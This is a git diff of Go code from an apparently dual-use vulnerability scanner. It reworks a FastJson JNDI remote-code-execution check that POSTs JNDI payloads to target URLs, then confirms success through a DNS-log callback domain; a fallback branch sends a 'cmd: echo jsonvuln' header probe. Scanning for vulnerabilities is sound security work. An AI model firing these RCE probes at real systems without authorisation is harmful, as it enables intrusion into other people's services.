@@ -8,20 +8,19 @@ import (
 	"strings"
 )
 
-func Check(u string) string {
-	domainx := getinputurl(u)
+func Check(u string, finalURL string) string {
+	domainx := getinputurl(finalURL)
 	for _, jsonurl := range domainx {
 		header := make(map[string]string)
 		header["Content-Type"] = "application/json"
 		if pkg.CeyeApi != "" && pkg.CeyeDomain != "" {
+			randomstr := pkg.RandomStr() + "fastjson"
 			for _, payload := range fastjsonJndiPayloads {
-				randomstr := pkg.RandomStr()
-				if _, err := pkg.HttpRequset(jsonurl, "POST", strings.Replace(payload, "dnslog-url", randomstr+"."+pkg.CeyeDomain, -1), false, header); err == nil {
-					if pkg.Dnslogchek(randomstr) {
-						pkg.GoPocLog(fmt.Sprintf("Found vuln FastJson JNDI RCE |%s\n", u))
-						return "JNDI RCE"
-					}
-				}
+				_, _ = pkg.HttpRequset(jsonurl, "POST", strings.Replace(payload, "dnslog-url", randomstr+"."+pkg.CeyeDomain, -1), false, header)
+			}
+			if pkg.Dnslogchek(randomstr) {
+				pkg.GoPocLog(fmt.Sprintf("Found vuln FastJson JNDI RCE |%s\n", u))
+				return "JNDI RCE"
 			}
 		} else {
 			header["cmd"] = "echo jsonvuln"
